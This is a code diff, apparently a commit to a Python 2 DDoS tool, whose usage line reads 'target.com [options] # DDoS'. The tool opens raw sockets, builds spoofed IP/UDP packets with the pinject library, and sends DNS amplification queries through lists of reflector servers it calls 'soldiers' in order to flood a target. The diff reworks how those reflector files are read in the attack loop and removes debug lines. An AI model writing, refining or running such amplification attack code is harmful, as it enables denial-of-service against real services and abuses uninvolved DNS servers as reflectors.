@@ -4,11 +4,9 @@ import time
 import socket
 import struct
 import threading
-import random
 from random import randint
 from optparse import OptionParser
 from pinject import IP, UDP
-
 
 USAGE = '''
 %prog target.com [options]        # DDoS
@@ -172,15 +170,14 @@ def Benchmark(ddos):
 		f.close()
 
 class DDoS(object):
-	def __init__(self, target, threads, domains, event, soldiers):
+	def __init__(self, target, threads, domains, event):
 		self.target = target
 		self.threads = threads
 		self.event = event
 		self.domains = domains
-                self.soldiers = soldiers
 	def stress(self):
 		for i in range(self.threads):
-			t = threading.Thread(target=self.__attack(random.choice(self.soldiers)))
+			t = threading.Thread(target=self.__attack)
 			t.start()
 	def __send(self, sock, soldier, proto, payload):
 		'''
@@ -233,21 +230,22 @@ class DDoS(object):
 		id = struct.pack('H', randint(0, 65535))
 		QName = self.__GetQName(domain)
 		return PAYLOAD['dns'].format(id, QName)
-	def __attack(self, soldier):
+	def __attack(self):
 		global npackets
 		global nbytes
 		_files = files
+		for proto in _files:	# Open Amplification files
+			f = open(_files[proto][FILE_NAME], 'r')
+			_files[proto].append(f)		# _files = {'proto':['file_name', file_handle]}
 		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 		i = 0
 		while self.event.isSet():
 			for proto in _files:
+				soldier = _files[proto][FILE_HANDLE].readline().strip()
 				if soldier:
 					if proto=='dns':
 						if not amplification[proto].has_key(soldier):
 							amplification[proto][soldier] = {}
-                                                #import pdb
-                                                #pdb.set_trace()
-                                                #print(soldier)
 						for domain in self.domains:
 							if not amplification[proto][soldier].has_key(domain):
 								size, _ = self.GetAmpSize(proto, soldier, domain)
@@ -274,13 +272,11 @@ class DDoS(object):
 						i+=1
 						nbytes += amplification[proto][soldier]
 						self.__send(sock, soldier, proto, amp)
+				else:
+					_files[proto][FILE_HANDLE].seek(0)
 		sock.close()
-
-def getSoldier(fn):
-    with open(fn) as f:
-        return f.read().split('\n')
-        
-    
+		for proto in _files:
+			_files[proto][FILE_HANDLE].close()
 
 def main():
 	parser = OptionParser(usage=USAGE)
@@ -291,13 +287,11 @@ def main():
 	if len(args)<1:
 		parser.print_help()
 		sys.exit()
-
 	if options.dns:
 		dns_file, domains = options.dns.split(':')
-                Soldiers = getSoldier(dns_file)
 		domains = GetDomainList(domains)
 		if domains:
-		        files['dns'] = [dns_file]
+			files['dns'] = [dns_file]
 		else:
 			print 'Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)'
 			sys.exit()
@@ -314,7 +308,7 @@ def main():
 			ddos = DDoS(args[0], options.threads, domains, event)
 			Benchmark(ddos)
 		else:
-			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event, Soldiers)
+			ddos = DDoS(socket.gethostbyname(args[0]), options.threads, domains, event)
 			ddos.stress()
 			Monitor()
 			event.clear()
